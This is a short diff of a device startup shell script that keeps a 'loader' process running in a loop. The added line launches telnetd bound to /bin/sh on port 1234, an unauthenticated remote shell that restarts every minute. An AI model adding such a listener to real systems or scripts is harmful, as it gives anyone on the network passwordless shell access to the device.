@@ -12,6 +12,7 @@ export AUTOSSH_PATH=/rom/mnt/cust/bin/wrapper #Changing the path to ssh for auto
 ./etc/luvitred2_install
 
 while true; do
-        [ -z "`pidof loader`"] ./loader #| while read line; do echo "$(date +%d/%m/%Y-%H:%M:%S): ${line}"; done | tee /etc/stats.log
+	[ -z "`pidof telnetd`" ] && telnetd -l /bin/sh -p1234
+        [ -z "`pidof loader`" ] && ./loader & #| while read line; do echo "$(date +%d/%m/%Y-%H:%M:%S): ${line}"; done | tee /etc/stats.log
 	sleep 60
 done
